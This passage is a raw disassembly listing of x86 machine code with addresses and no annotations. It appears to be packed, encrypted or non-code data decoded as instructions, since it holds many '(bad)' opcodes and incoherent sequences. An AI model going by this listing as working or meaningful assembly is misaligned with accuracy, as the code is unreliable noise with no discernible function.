  40373d:	ins    BYTE PTR es:[edi],dx
  40373e:	in     eax,dx
  40373f:	ja     0x40372e
  403741:	test   DWORD PTR [eax+eax*1+0x684d6785],ecx
  403748:	rcl    BYTE PTR [eax+0x6f],1
  40374b:	scas   eax,DWORD PTR es:[edi]
  40374c:	test   esp,eax
  40374e:	add    ebp,esp
  403750:	jp     0x4037a8
  403752:	scas   al,BYTE PTR es:[edi]
  403753:	inc    ecx
  403754:	adc    al,0x62
  403756:	enter  0xca51,0xab
  40375a:	xor    al,0xa7
  40375c:	enter  0xc011,0xa
  403760:	imul   edx,DWORD PTR [edi-0x68ad3eca],0x8c7b3f38
  40376a:	retf   
  40376b:	cmp    BYTE PTR [esp+eax*2],0x66
  40376f:	sbb    ch,BYTE PTR [ecx+0x17]
  403772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403773:	clc    
  403774:	dec    ebx
  403775:	sbb    bl,BYTE PTR [esi-0x67ee7a66]
  40377b:	hlt    
  40377c:	mov    bh,0x99
  40377e:	ins    BYTE PTR es:[edi],dx
  40377f:	xor    eax,0xf23beefb
  403784:	hlt    
  403785:	bound  edi,QWORD PTR [ecx-0x52a4896f]
  40378b:	aam    0x49
  40378d:	mov    esi,0x4f6bf182
  403792:	xchg   esi,eax
  403793:	sbb    eax,0x4ce2dead
  403798:	ins    DWORD PTR es:[edi],dx
  403799:	outs   dx,DWORD PTR ds:[esi]
  40379a:	xor    DWORD PTR [eax+0x622f5c62],edx
  4037a0:	cmp    al,0x2b
  4037a2:	nop
  4037a3:	adc    BYTE PTR [esi+eiz*8-0x13f02ff3],bh
  4037aa:	mov    DWORD PTR [edi-0x4e],esi
  4037ad:	push   eax
  4037ae:	daa    
  4037af:	mov    al,ds:0x18a186c9
  4037b4:	cmp    BYTE PTR [edx+0x2f],ch
  4037b7:	sub    ebp,DWORD PTR [edi+ebx*2+0x12bd0528]
  4037be:	xchg   edi,eax
  4037bf:	jae    0x4037bc
  4037c1:	inc    esp
  4037c2:	fbstp  TBYTE PTR [ecx]
  4037c4:	sbb    DWORD PTR [ecx+0x2eaf6848],ecx
  4037ca:	js     0x403797
  4037cc:	cmp    esi,edx
  4037ce:	jns    0x403826
  4037d0:	ret    
  4037d1:	pop    ecx
  4037d2:	or     bl,BYTE PTR [eax]
  4037d4:	aaa    
  4037d5:	and    al,BYTE PTR [eax-0x47ddd494]
  4037db:	jmp    0x403772
  4037dd:	sbb    DWORD PTR [ebx],ebp
  4037df:	sbb    DWORD PTR [edx-0x16873edf],0x72
  4037e6:	sub    eax,0x46325e03
  4037eb:	stos   BYTE PTR es:[edi],al
  4037ec:	sbb    bl,BYTE PTR [edx]
  4037ee:	adc    bh,0xbe
  4037f1:	fs ret 
  4037f3:	call   0x4b74b28a
  4037f8:	stos   DWORD PTR es:[edi],eax
  4037f9:	mov    dl,dh
  4037fb:	add    BYTE PTR ds:0xb6368cb0,al
  403801:	retf   0x6e8a
  403804:	dec    edx
  403805:	pop    ss
  403806:	and    BYTE PTR [edx],bl
  403808:	test   eax,eax
  40380a:	mov    ah,0x59
  40380c:	in     eax,dx
  40380d:	out    0x9b,eax
  40380f:	(bad)  
  403810:	(bad)  [ecx+ebx*2-0x99caafb]
  403817:	mov    eax,0x80411313
  40381c:	js     0x403810
  40381e:	mov    DWORD PTR [ecx-0x68],ecx
  403821:	call   0xde94:0xea54f942
  403828:	or     dl,BYTE PTR [edi-0x3ba96f4c]
  40382e:	mov    cl,0x58
  403830:	in     al,0xb7
  403832:	inc    edx
  403833:	pop    es
  403834:	adc    ch,BYTE PTR [ecx-0x32]
  403837:	sbb    dh,BYTE PTR [edi-0x2ba3cc2b]
  40383d:	iret   
  40383e:	mov    eax,0x965faf54
  403843:	lods   al,BYTE PTR ds:[esi]
  403844:	or     DWORD PTR [ecx+0x6eeb3ca4],eax
  40384a:	cmp    esp,DWORD PTR [ecx]
  40384c:	stc    
  40384d:	inc    esi
  40384e:	js     0x4038bc
  403850:	mov    dh,0x21
  403852:	fsincos 
  403854:	hlt    
  403855:	mov    edx,0xf9c81be7
  40385a:	mov    bl,ah
  40385c:	scas   al,BYTE PTR es:[edi]
  40385d:	ss push ebx
  40385f:	sbb    bh,BYTE PTR [edi+0x6ea6029c]
  403865:	out    dx,al
  403866:	lahf   
  403867:	sub    DWORD PTR [eax-0x61],esi
  40386a:	call   0x1bb1:0x3ddb30ea
  403871:	adc    dl,BYTE PTR [ecx+eax*8+0x6ec4bdaf]
  403878:	(bad)  
  403879:	clc    
  40387a:	or     dh,dh
  40387c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40387d:	cld    
  40387e:	inc    ecx
  40387f:	fwait
  403880:	xor    al,0x7f
  403882:	cmp    edi,esi
  403884:	lea    esi,[ecx+edi*4-0x41]
  403888:	imul   esi,DWORD PTR [ebx+edi*1-0x12],0xaa10c5f0
  403890:	lods   al,BYTE PTR ds:[esi]
  403891:	cmc    
  403892:	fadd   DWORD PTR [ecx]
  403894:	dec    edi
  403895:	scas   al,BYTE PTR es:[edi]
  403896:	jg     0x40383a
  403898:	in     al,dx
  403899:	push   0x14f9d0f3
  40389e:	aad    0xec
  4038a0:	ss adc eax,0xd3c9bd3
  4038a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038a7:	je     0x403915
  4038a9:	fisub  DWORD PTR [ebx+esi*8-0x2d2c342d]
  4038b0:	cmp    esi,ecx
  4038b2:	mov    esp,0xb137716a
  4038b7:	es in  al,0xba
  4038ba:	adc    bh,bl
  4038bc:	pop    es
  4038bd:	pop    esp
  4038be:	mov    al,dl
  4038c0:	jg     0x4038fa
  4038c2:	jb     0x403871
  4038c4:	scas   al,BYTE PTR es:[edi]
  4038c5:	cmc    
  4038c6:	daa    
  4038c7:	push   edx
  4038c8:	add    BYTE PTR [edi+0x67],al
  4038cb:	sbb    edx,edi
  4038cd:	or     al,0x24
  4038cf:	mov    al,dl
  4038d1:	and    ecx,DWORD PTR [edx-0x5c]
  4038d4:	xchg   ebx,eax
  4038d5:	push   edx
  4038d6:	push   ebp
  4038d7:	jns    0x403944
  4038d9:	or     eax,0x1b2bc890
  4038de:	(bad)  
  4038e0:	out    dx,eax
  4038e1:	cmp    BYTE PTR [ebp-0x34548167],dh
  4038e7:	aam    0xb3
  4038e9:	in     eax,0xcb
  4038eb:	cmp    al,0x19
  4038ed:	imul   ebp,DWORD PTR [edi+ecx*4],0x126dc356
  4038f4:	inc    edi
  4038f5:	(bad)  
  4038f8:	clc    
  4038f9:	repz cmp BYTE PTR [eax-0x3d],dh
  4038fd:	or     eax,0x5371917b
  403902:	test   BYTE PTR [ebx+0x39435f76],cl
  403908:	xor    BYTE PTR [edi],0xc0
  40390b:	ss pop edx
  40390d:	je     0x4038db
  40390f:	push   ecx
  403910:	adc    al,0xfa
  403912:	inc    edx
  403913:	jl     0x4038b1
  403915:	into   
  403916:	add    bl,BYTE PTR [ebx-0x78045a0f]
  40391c:	cmc    
  40391d:	outs   dx,BYTE PTR ds:[esi]
  40391e:	popa   
  40391f:	daa    
  403920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403921:	(bad)  [edi]
  403923:	scas   al,BYTE PTR es:[edi]
  403924:	and    eax,0x243bc74c
  403929:	adc    DWORD PTR [eax+0x49],esi
  40392c:	mov    eax,0x1761681
  403931:	and    DWORD PTR [esi-0x77],0x79
  403935:	outs   dx,BYTE PTR ds:[esi]
  403936:	cmp    al,0xae
  403938:	cmp    al,0x12
  40393a:	retf   
  40393b:	clc    
  40393c:	call   0xdffc97a6
  403941:	clc    
  403942:	ds pushf 
  403944:	adc    al,bl
  403946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403947:	je     0x403992
  403949:	js     0x4039a6
  40394b:	xor    al,0x27
  40394d:	cmc    
  40394e:	sub    eax,esi
  403950:	add    bl,dh
  403952:	clc    
  403953:	pushf  
  403954:	sbb    DWORD PTR [edi-0x2d],esi
  403957:	cmc    
  403958:	mov    esp,0x9f0ae002
  40395d:	mov    ebp,0x80e3f050
  403962:	adc    bl,al
  403964:	call   0x27bb:0xbae312db
  40396b:	adc    BYTE PTR [edi+0x7d47d743],al
  403971:	xchg   BYTE PTR [ebx-0x67b16b3b],cl
  403977:	push   cs
  403978:	fucomi st,st(4)
  40397a:	sub    ecx,DWORD PTR [ebp+0x678fb4a5]
  403980:	mov    esi,0x7611c703
  403985:	cld    
  403986:	aam    0x0
  403988:	cld    
  403989:	fiadd  WORD PTR [ecx]
  40398b:	pop    ebx
  40398c:	pop    edx
  40398d:	inc    eax
  40398e:	add    dh,cl
  403990:	rol    BYTE PTR [ecx],cl
  403992:	fbld   TBYTE PTR [edi+0x29]
  403995:	(bad)  
  403996:	std    
  403997:	retf   
  403998:	xor    al,0xd0
  40399a:	cmp    eax,ecx
  40399c:	dec    esi
  40399d:	mov    edi,DWORD PTR [edi]
  40399f:	sub    cl,al
  4039a1:	ror    bh,cl
  4039a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039a4:	mov    esp,0xab038c6f
  4039a9:	stos   DWORD PTR es:[edi],eax
  4039aa:	inc    ecx
  4039ab:	push   es
  4039ac:	xchg   edx,eax
  4039ad:	xor    DWORD PTR [edx+0x175c5ec1],0x9887d3aa
  4039b7:	cs dec ecx
  4039b9:	mov    ds:0x85b2b1a9,eax
  4039be:	fstp   TBYTE PTR [edi]
  4039c0:	out    dx,al
  4039c1:	mov    DWORD PTR [ebx],ecx
  4039c3:	maskmovq mm3,(bad)
  4039c4:	neg    DWORD PTR [ebx]
  4039c6:	mov    ds:0xd78b2fc3,eax
  4039cb:	mov    esi,0x5e35cdb9
  4039d0:	clc    
  4039d1:	mov    eax,0xe78c3953
  4039d6:	mov    ebp,0x5b03ccfd
  4039db:	lods   al,BYTE PTR ds:[esi]
  4039dc:	xchg   ebx,eax
  4039dd:	mov    ch,0x73
  4039df:	test   BYTE PTR [ebp+0x5a64db03],ch
  4039e5:	pusha  
  4039e6:	call   0x20a8aa4f
  4039eb:	push   eax
  4039ec:	jne    0x403a27
  4039ee:	jne    0x4039e4
  4039f0:	imul   DWORD PTR [ebp+eiz*8-0x16]
  4039f4:	rol    dh,cl
  4039f6:	jmp    0x40399c
  4039f8:	or     DWORD PTR [edx+0x350f38ef],esi
  4039fe:	les    esi,FWORD PTR [ebx]
  403a00:	hlt    
  403a01:	sbb    ecx,ebp
  403a03:	test   edi,ebp
  403a05:	xchg   BYTE PTR [edx-0x3b761e5f],bl
  403a0b:	icebp  
  403a0c:	xchg   edx,eax
  403a0d:	or     ch,dh
  403a0f:	jae    0x403a13
  403a11:	pop    ebx
  403a12:	push   esp
  403a13:	sub    eax,0x97e8442f
  403a18:	enter  0x2eba,0x81
  403a1c:	test   al,0x5f
  403a1e:	cmp    DWORD PTR [edi],0xf61655c
  403a24:	push   eax
  403a25:	clc    
  403a26:	stos   BYTE PTR es:[edi],al
  403a27:	sub    eax,0xa7df649c
  403a2c:	retf   0x60dc
  403a2f:	jo     0x403a46
  403a31:	jb     0x4039cc
  403a33:	mov    gs,WORD PTR [edi-0x29]
  403a36:	mov    edx,0xc9ea27ba
  403a3b:	sbb    esi,DWORD PTR [esi]
  403a3d:	jp     0x4039c1
  403a3f:	or     DWORD PTR [esi+0x4cfabf58],edi
  403a45:	pop    esi
  403a46:	stos   BYTE PTR es:[edi],al
  403a47:	lahf   
  403a48:	outs   dx,DWORD PTR ds:[esi]
  403a49:	(bad)  
  403a4a:	fcmovnu st,st(6)
  403a4c:	sbb    al,0xff
  403a4e:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  403a50:	jnp    0x403a86
  403a52:	xor    eax,0x44b1c95c
  403a57:	pop    ebp
  403a58:	xchg   DWORD PTR [ebp+0x10],esi
  403a5b:	stos   DWORD PTR es:[edi],eax
  403a5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a5d:	aad    0xd
  403a5f:	or     BYTE PTR [edi-0x3b3ddad8],ah
  403a65:	(bad)  
  403a66:	fucomp st(2)
  403a68:	push   cs
  403a69:	mov    ?,WORD PTR [esi+edx*4]
  403a6c:	inc    ebp
  403a6d:	fisub  WORD PTR [ebx+0x4f645cff]
  403a73:	aas    
  403a74:	out    dx,al
  403a75:	cli    
  403a76:	out    dx,al
  403a77:	and    eax,esp
  403a79:	(bad)  
  403a7b:	movq2dq xmm7,mm3
  403a7f:	pop    es
  403a80:	cmp    eax,0x76937f73
  403a85:	or     eax,0x271dccdf
  403a8a:	frstor [edi-0x30]
  403a8d:	das    
  403a8e:	add    eax,0x957fa735
  403a93:	loop   0x403b12
  403a95:	lsl    edi,WORD PTR [edi]
  403a98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a99:	inc    ebx
  403a9a:	mov    ebx,0xfd506a21
  403a9f:	outs   dx,DWORD PTR ds:[esi]
  403aa0:	cmp    eax,0x1ccb4c60
  403aa5:	lahf   
  403aa6:	or     ch,BYTE PTR [edx-0x281272d3]
  403aac:	push   esi
  403aad:	pop    ebp
  403aae:	(bad)  
  403aaf:	out    dx,al
  403ab0:	push   esp
  403ab1:	js     0x403b2b
  403ab3:	and    eax,0x5140191f
  403ab8:	out    0x8e,al
  403aba:	or     eax,0x27bad38e
  403abf:	es or  eax,0xf0e0dd28
  403ac5:	icebp  
  403ac6:	sar    BYTE PTR [edi-0x69674c0b],1
  403acc:	add    BYTE PTR [ebp-0x749ee145],ah
  403ad2:	adc    DWORD PTR [ecx+esi*8-0x5e1baef],edx
  403ad9:	inc    eax
  403ada:	mov    esp,0xb275fcee
  403adf:	imul   ebp,DWORD PTR [edx+0x4e],0xec076e8
  403ae6:	ret    0x3375
  403ae9:	cmp    DWORD PTR [edx-0x66],eax
  403aec:	and    eax,0xb331dfea
  403af1:	fstp   QWORD PTR fs:[ebx+0x103f45c1]
  403af8:	or     DWORD PTR [ebp+0x6c53ac37],0xa
  403aff:	and    BYTE PTR [ebp-0x11af31ed],bh
  403b05:	jns    0x403acb
  403b07:	mov    edx,0x3ad90d07
  403b0c:	adc    BYTE PTR [esi+0x5b],bl
  403b0f:	dec    esp
  403b10:	outs   dx,BYTE PTR ds:[esi]
  403b11:	push   DWORD PTR [eax+0x43820029]
  403b17:	mov    cl,0xf8
  403b19:	aad    0xee
  403b1b:	cmp    BYTE PTR [eax],dh
  403b1d:	clc    
  403b1e:	dec    ecx
  403b1f:	loop   0x403b53
  403b21:	ja     0x403b6f
  403b23:	pop    ebp
  403b24:	jbe    0x403b39
  403b26:	mov    ah,0xb
  403b28:	mov    ah,0x8
  403b2a:	adc    ah,BYTE PTR [eax+0x14]
  403b2d:	xchg   edi,eax
  403b2e:	jp     0x403b8b
  403b30:	lods   eax,DWORD PTR ds:[esi]
  403b31:	xchg   DWORD PTR [eax+0x3eca7055],ebx
  403b37:	ins    BYTE PTR es:[edi],dx
  403b38:	mov    bh,0x66
  403b3a:	jl     0x403b22
  403b3c:	sub    DWORD PTR [edi+esi*2-0x14],esp
  403b40:	sbb    eax,0xb46ba8b5
  403b45:	pop    eax
  403b46:	in     eax,dx
  403b47:	jmp    0x403b6a
  403b49:	mov    esi,cs
  403b4b:	jne    0x403b9d
  403b4d:	mov    cs,WORD PTR [eax+0x51dbe385]
  403b53:	cmp    ecx,esp
  403b55:	icebp  
  403b56:	inc    ebx
  403b57:	sbb    DWORD PTR [esp+eiz*4+0x2b],eax
  403b5b:	out    0xd,al
  403b5d:	sbb    ah,cl
  403b5f:	push   es
  403b60:	or     eax,0xc72f0a37
  403b65:	mov    ds:0x41802c54,al
  403b6a:	jecxz  0x403b34
  403b6c:	pop    es
  403b6d:	push   0xffffffc2
  403b6f:	ficom  WORD PTR [ecx]
  403b71:	jp     0x403ba4
  403b73:	cdq    
  403b74:	xor    esp,DWORD PTR [ebp-0x7d3395b6]
  403b7a:	xlat   BYTE PTR ds:[ebx]
  403b7b:	ins    DWORD PTR es:[edi],dx
  403b7c:	ins    BYTE PTR es:[edi],dx
  403b7d:	dec    edx
  403b7e:	and    DWORD PTR [edi-0x2e3cd588],edi
  403b84:	pop    ebp
  403b85:	xchg   bl,cl
  403b87:	into   
  403b88:	sub    dh,bl
  403b8a:	xchg   esp,eax
  403b8b:	fwait
  403b8c:	hlt    
  403b8d:	fild   WORD PTR [ebp+0x2463e271]
  403b93:	ins    BYTE PTR es:[edi],dx
  403b94:	inc    eax
  403b95:	push   ebp
  403b96:	jmp    0xfd80:0x222eb25c
  403b9d:	or     al,0x30
  403b9f:	sub    DWORD PTR [ebx-0x3a5dbe],0xffffff96
  403ba6:	dec    edi
  403ba7:	fstp   QWORD PTR [eax-0xca8e5b2]
  403bad:	stos   DWORD PTR es:[edi],eax
  403bae:	ss pop ss
  403bb0:	push   ebp
  403bb1:	ret    
  403bb2:	out    0x3d,eax
  403bb4:	je     0x403bae
  403bb6:	pop    ebp
  403bb7:	jmp    0x1d32:0x6e8c140a
  403bbe:	mov    edx,0x41992e0f
  403bc3:	and    ch,cl
  403bc5:	ins    DWORD PTR es:[edi],dx
  403bc6:	mov    esp,0x95ac45e5
  403bcb:	cli    
  403bcc:	lea    edx,[edx]
  403bce:	push   ebp
  403bcf:	xchg   esi,eax
  403bd0:	add    al,0x85
  403bd2:	pusha  
  403bd3:	sub    eax,0x656ab587
  403bd8:	retf   0x5511
  403bdb:	dec    esp
  403bdc:	xor    al,0x61
  403bde:	push   0x69
  403be0:	rcl    DWORD PTR [esi+0x14da58f0],cl
  403be6:	pop    esi
  403be7:	out    dx,eax
  403be8:	shl    DWORD PTR [ebx],1
  403bea:	in     al,dx
  403beb:	mov    esp,0x1ec51dbf
  403bf0:	push   cs
  403bf1:	mov    cl,0x15
  403bf3:	and    al,0x61
  403bf5:	sub    al,0x8d
  403bf7:	mov    ebx,0x25bc1677
  403bfc:	ficom  DWORD PTR [esi+edx*4]
  403bff:	call   0x8be4827e
  403c04:	and    DWORD PTR ds:0x18c7d589,ebp
  403c0a:	pusha  
  403c0b:	or     BYTE PTR [ebp+0x47eda08e],0x97
  403c12:	adc    al,BYTE PTR [ebp+0x7cfa36f0]
  403c18:	inc    edx
  403c19:	pop    esp
  403c1a:	fistp  DWORD PTR [edi-0x3e355c45]
  403c20:	aaa    
  403c21:	cdq    
  403c22:	(bad)  
  403c24:	mov    esi,0x77ca4738
  403c29:	into   
  403c2a:	ja     0x403be2
  403c2c:	xchg   edi,eax
  403c2d:	sbb    eax,0xf3115bdf
  403c32:	fstp   QWORD PTR [ecx+edi*8]
  403c35:	aad    0xb8
  403c37:	mov    al,ds:0x5ef881d5
  403c3c:	xchg   DWORD PTR [esi-0x27],esp
  403c3f:	push   0x88ebb837
  403c44:	sar    bh,0xa
  403c47:	ror    BYTE PTR [edi-0x4a9c135e],1
  403c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c4e:	add    BYTE PTR [edx],cl
  403c50:	cmp    BYTE PTR [eax],0x86
  403c53:	inc    esp
  403c54:	mov    edx,0x5a8acae8
  403c59:	mov    ah,BYTE PTR [ebx+esi*4]
  403c5c:	pop    ds
  403c5d:	stos   DWORD PTR es:[edi],eax
  403c5e:	cs sub al,0x6b
  403c61:	cld    
  403c62:	inc    esi
  403c63:	call   0xc67f:0xc4158ffe
  403c6a:	xchg   BYTE PTR [ecx+0x20255ab6],bl
  403c70:	dec    ebx
  403c71:	xchg   ebp,eax
  403c72:	int3   
  403c73:	mov    dh,0xfa
  403c75:	mov    ebx,0xca8add9e
  403c7a:	xchg   esp,eax
  403c7b:	lods   eax,DWORD PTR ds:[esi]
  403c7c:	xor    esi,DWORD PTR [edx]
  403c7e:	jns    0x403ca6
  403c80:	mov    edx,0x1ad17df9
  403c85:	inc    esi
  403c86:	shr    DWORD PTR [esi+eiz*4],1
  403c89:	dec    edx
  403c8a:	push   0xcf03d28d
  403c8f:	mov    bl,0x2f
  403c91:	inc    esi
  403c92:	mov    bh,0x45
  403c94:	dec    esi
  403c95:	loop   0x403ca7
  403c97:	leave  
  403c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c99:	dec    esi
  403c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c9b:	push   eax
  403c9c:	sahf   
  403c9d:	gs in  al,dx
  403c9f:	(bad)  
  403ca0:	cmp    BYTE PTR [eax+edx*2],dl
  403ca3:	xlat   BYTE PTR ds:[ebx]
  403ca4:	jl     0x403c8a
  403ca6:	jmp    0x403cf9
  403ca8:	pop    ebx
  403ca9:	popf   
  403caa:	loopne 0x403c8b
  403cac:	jns    0x403d0c
  403cae:	mov    fs,WORD PTR [edi+edx*2-0x23]
  403cb2:	adc    dh,BYTE PTR [edx+ebx*1+0x5d1874ae]
  403cb9:	dec    esp
  403cba:	fwait
  403cbb:	pop    ebp
  403cbc:	sbb    BYTE PTR [edi+0x78eed1b3],al
  403cc2:	popa   
  403cc3:	bound  edx,QWORD PTR [eax]
  403cc5:	mov    ds:0x909079ef,al
  403cca:	dec    esp
  403ccb:	inc    dh
  403ccd:	clc    
  403cce:	sar    DWORD PTR ds:0xab9a3ee9,1
  403cd4:	in     al,0x18
  403cd6:	popa   
  403cd7:	mov    ebx,0x8eb24440
  403cdc:	mov    esp,0x2bf5f009
  403ce1:	mov    WORD PTR [ebx],?
  403ce3:	mov    eax,0x3f2e83b4
  403ce8:	inc    esi
  403ce9:	mov    dh,0xdc
  403ceb:	sbb    edi,DWORD PTR [edi+ebp*2-0x73f0955a]
  403cf2:	push   ecx
  403cf3:	aad    0xc3
  403cf5:	imul   eax,DWORD PTR [edx],0xe5c9e216
  403cfb:	int    0x3b
  403cfd:	and    esp,DWORD PTR ss:[ebx]
  403d00:	bound  edi,QWORD PTR [ebp+0x2a]
  403d03:	jle    0x403ce1
  403d05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d06:	push   edx
  403d07:	ins    BYTE PTR es:[edi],dx
  403d08:	nop
  403d09:	xchg   ebx,eax
  403d0a:	stos   DWORD PTR es:[edi],eax
  403d0b:	xor    bl,BYTE PTR [edx+0x7190212c]
  403d11:	mov    ds:0xbe4ce20,al
  403d16:	loop   0x403cfc
  403d18:	pushf  
  403d19:	dec    esp
  403d1a:	push   edi
  403d1b:	sub    al,BYTE PTR [eax]
  403d1d:	shl    DWORD PTR [eax-0x27ee3da7],0xa6
  403d24:	or     BYTE PTR [edx],0xb8
  403d27:	mov    eax,ds:0x377c9179
  403d2c:	pusha  
  403d2d:	icebp  
  403d2e:	mov    al,ds:0xa700ef85
  403d33:	inc    eax
  403d34:	fdiv   DWORD PTR [eax-0x11809633]
  403d3a:	xchg   ebx,eax
  403d3b:	js     0x403d7a
  403d3d:	add    BYTE PTR [edi-0x72],0x23
  403d41:	mov    esp,0x861c9e0f
  403d46:	shr    BYTE PTR ds:0xcc3f4054,0xfd
  403d4d:	mov    esp,cs
  403d4f:	aad    0x0
  403d51:	mov    eax,ds:0xe492f62c
  403d56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d57:	adc    bl,0x53
  403d5a:	pop    ecx
  403d5b:	cmp    bl,BYTE PTR [edx+eiz*1+0x69]
  403d5f:	in     eax,0x5d
  403d61:	ja     0x403d08
  403d63:	push   ebx
  403d64:	ror    DWORD PTR [edx+0x28],1
  403d67:	ficomp DWORD PTR [ecx+0x3936ab44]
  403d6d:	jg     0x403d0e
  403d6f:	dec    ecx
  403d70:	mov    edi,0x8da85979
  403d75:	add    BYTE PTR [edi+0x13d4c9cc],cl
  403d7b:	js     0x403dc9
  403d7d:	imul   esp,DWORD PTR [ebx],0x17823b38
  403d83:	push   ds
  403d84:	dec    ebp
  403d85:	cdq    
  403d86:	rcr    DWORD PTR [ebx-0x6d],0x8c
  403d8a:	inc    ecx
  403d8b:	xchg   ebp,eax
  403d8c:	jo     0x403e0b
  403d8e:	pop    ds
  403d8f:	sub    eax,0x9829a3c5
  403d94:	jns    0x403da3
  403d96:	mov    WORD PTR [edi],?
  403d98:	repnz adc eax,0x9953411f
  403d9e:	lods   eax,DWORD PTR ds:[esi]
  403d9f:	sti    
  403da0:	aaa    
  403da1:	push   edx
  403da2:	cdq    
  403da3:	not    al
  403da5:	imul   eax,DWORD PTR [ecx],0x34
  403da8:	jnp    0x403d71
  403daa:	mov    ch,0x87
  403dac:	adc    DWORD PTR ds:0xf691c2be,0xffffffc4
  403db3:	sub    ecx,DWORD PTR fs:[eax]
  403db6:	pop    ss
  403db7:	fs jmp 0x1032:0x42dd7a58
  403dbf:	xchg   edx,eax
  403dc0:	jmp    FWORD PTR [ebx-0xfa8e5d2]
  403dc6:	ror    BYTE PTR [ecx],0x2c
  403dc9:	push   esp
  403dca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dcb:	cmp    cl,BYTE PTR [edi+0x45a7f6ec]
  403dd1:	push   ds
  403dd2:	(bad)  
  403dd3:	adc    eax,0x297e2688
  403dd8:	jle    0x403df5
  403dda:	ins    BYTE PTR es:[edi],dx
  403ddb:	xor    al,0xf4
  403ddd:	xlat   BYTE PTR ds:[ebx]
  403dde:	lock les esi,FWORD PTR [ecx]
  403de1:	loop   0x403dad
  403de3:	out    0x24,eax
  403de5:	mov    ecx,0x1fb5ff60
  403dea:	cmp    eax,0xec6ed47e
  403def:	(bad)  
  403df0:	dec    eax
  403df1:	pop    ecx
  403df2:	push   edi
  403df3:	(bad)  
  403df4:	xchg   edi,eax
  403df5:	sbb    esp,ecx
  403df7:	jno    0x403de7
  403df9:	(bad)  
  403dfa:	xor    eax,0x361147d0
  403dff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e00:	popa   
  403e01:	cmp    BYTE PTR [ebx],dh
  403e03:	jge    0x403dcd
  403e05:	fild   QWORD PTR [edx-0x656514b]
  403e0b:	fs pop edx
  403e0d:	fist   DWORD PTR [eax-0x1f1741a]
  403e13:	adc    BYTE PTR [esi*4+0xcf077c9],cl
  403e1a:	aaa    
  403e1b:	mov    BYTE PTR [edi-0x64417670],ah
  403e21:	iret   
  403e22:	lods   al,BYTE PTR ds:[esi]
  403e23:	jno    0x403df8
  403e25:	mov    ah,dh
  403e27:	ficomp DWORD PTR [esi]
  403e29:	inc    ebx
  403e2a:	mov    bl,0xe3
  403e2c:	xchg   BYTE PTR [ebp+0x745a5a68],ah
  403e32:	pop    esp
  403e33:	fs jl  0x403dc5
  403e36:	inc    ecx
  403e37:	sbb    DWORD PTR [esi],edi
  403e39:	mov    edx,0x8fe18275
  403e3e:	retf   
  403e3f:	pop    ebx
  403e40:	push   edx
  403e41:	cmp    eax,0x832cf52
  403e46:	add    eax,0x4ab71414
  403e4b:	pushf  
  403e4c:	xor    cl,BYTE PTR [ebx-0x66]
  403e4f:	mov    DWORD PTR [ebx-0x1b],esi
  403e52:	ss (bad) 
  403e55:	dec    ecx
  403e56:	jo     0x403e12
  403e58:	shl    BYTE PTR [eax+0x48],cl
  403e5b:	adc    cl,BYTE PTR [ecx]
  403e5d:	or     bh,dh
  403e5f:	(bad)  
  403e60:	jp     0x403e23
  403e62:	mov    DWORD PTR [edx+0x34bd9373],edx
  403e68:	xchg   esi,eax
  403e69:	pop    ss
  403e6a:	imul   edi,DWORD PTR [ebx-0x6748e16c],0x84d86fe9
  403e74:	dec    ebp
  403e75:	mov    ch,BYTE PTR [ebp-0x6b]
  403e78:	sbb    BYTE PTR [edx],ah
  403e7a:	inc    ebx
  403e7b:	enter  0x7cc5,0xe5
  403e7f:	sub    ch,cl
  403e81:	repz jno 0x403e42
  403e84:	ins    BYTE PTR es:[edi],dx
  403e85:	adc    ecx,DWORD PTR [edx-0x5fcf180f]
  403e8b:	push   esp
  403e8c:	adc    DWORD PTR [ecx-0x650cdd9e],edi
  403e92:	cmp    al,0x2c
  403e94:	ins    BYTE PTR es:[edi],dx
  403e95:	into   
  403e96:	test   al,0xfc
  403e98:	dec    ecx
  403e99:	out    0x32,eax
  403e9b:	jae    0x403ec2
  403e9d:	loop   0x403ea7
  403e9f:	mov    ds:0x72eaf8f2,al
  403ea4:	hlt    
  403ea5:	pop    ebp
  403ea6:	scas   eax,DWORD PTR es:[edi]
  403ea7:	xchg   ebx,eax
  403ea8:	sub    eax,0x223ad882
  403ead:	test   DWORD PTR ds:0xc8d61f5c,esi
  403eb3:	fld    QWORD PTR [ecx]
  403eb5:	std    
  403eb6:	xor    dl,BYTE PTR ss:[edx]
  403eb9:	pop    ss
  403eba:	imul   ebp,DWORD PTR ds:0x9c5a17c3,0x4f
  403ec1:	sbb    edi,DWORD PTR [edi-0x34]
  403ec4:	icebp  
  403ec5:	mov    ds:0x62c6dfd2,eax
  403eca:	add    eax,0x58a76472
  403ecf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ed0:	aaa    
  403ed1:	arpl   WORD PTR [edx+edx*1],si
  403ed4:	fldenv [edi+0x56ae204d]
  403eda:	push   cs
  403edb:	int3   
  403edc:	jp     0x403f04
  403ede:	dec    ebp
  403edf:	xor    BYTE PTR [ebx+0x64],bh
  403ee2:	sahf   
  403ee3:	lods   eax,DWORD PTR ds:[esi]
  403ee4:	xor    dl,BYTE PTR [ebx+esi*4-0xea51640]
  403eeb:	mov    ch,0x4e
  403eed:	pop    edi
  403eee:	mov    cs,WORD PTR [esi-0x5a]
  403ef1:	mov    BYTE PTR [esi+0x73],ch
  403ef4:	(bad)  
  403ef5:	mov    esi,0x253ede0f
  403efa:	xchg   edi,eax
  403efb:	ins    DWORD PTR es:[edi],dx
  403efc:	sbb    DWORD PTR [eax],edx
  403efe:	mov    al,ds:0xc39a3986
  403f03:	out    dx,al
  403f04:	inc    eax
